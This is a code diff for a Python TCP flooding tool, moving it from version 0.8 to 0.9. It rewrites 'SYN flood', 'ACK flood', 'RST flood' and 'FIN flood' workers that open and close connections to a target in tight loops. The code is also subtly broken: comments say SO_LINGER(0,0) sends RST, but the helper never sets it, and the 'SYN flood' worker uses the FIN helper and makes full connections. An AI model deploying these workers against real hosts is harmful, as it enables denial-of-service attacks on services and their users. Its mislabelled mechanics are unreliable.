@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "0.8"
+VERSION = "0.9"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -430,54 +430,64 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
 # ── SYN flood: connect only, never read ──────────────────────────
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
+    loop = asyncio.get_event_loop()
     while not stop.is_set():
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=2.0)
+            s = await loop.run_in_executor(None, _open_fin_sock, host, port)
             stats.conns += 1
-            # SYN flood: connect and immediately close (SYN-ACK received, ACK sent)
-            writer.transport.close()
+            s.close()
         except Exception:
             stats.errors += 1
 
 # ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
 async def synack_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
+    loop = asyncio.get_event_loop()
     while not stop.is_set():
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=2.0)
+            s = await loop.run_in_executor(None, _open_rst_sock, host, port)
             stats.conns += 1
-            # RST: abort the connection
-            writer.transport.abort()
+            s.close()  # SO_LINGER(0,0) → RST
         except Exception:
             stats.errors += 1
 
-# ── RST flood: connect → send 1 byte → close (RST) ───────────────
+# ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
+def _open_rst_sock(host, port):
+    """Open TCP conn; close() after send with unread data → RST (no SO_LINGER)."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2.0)
+    s.connect((host, port))
+    return s
+
 async def rst_worker(name, url, stats, duration, stop, payload_size=1):
     host, port = parse_ip_port(url)
     payload = b"X" * max(1, payload_size)
+    loop = asyncio.get_event_loop()
     while not stop.is_set():
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=2.0)
+            s = await loop.run_in_executor(None, _open_rst_sock, host, port)
             stats.conns += 1
-            writer.write(payload)
-            # Force RST by closing without reading
-            writer.transport.abort()
+            s.send(payload)
+            s.close()  # SO_LINGER(0,0) → RST
         except Exception:
             stats.errors += 1
 
 # ── FIN flood: connect → graceful close (FIN) ────────────────────
+def _open_fin_sock(host, port):
+    """Open a TCP connection, drain nothing, close gracefully (FIN)."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2.0)
+    s.connect((host, port))
+    return s
+
 async def fin_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
+    loop = asyncio.get_event_loop()
     while not stop.is_set():
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port), timeout=2.0)
+            s = await loop.run_in_executor(None, _open_fin_sock, host, port)
             stats.conns += 1
-            # FIN: graceful close
-            writer.close()
+            s.close()  # graceful → FIN
         except Exception:
             stats.errors += 1
 
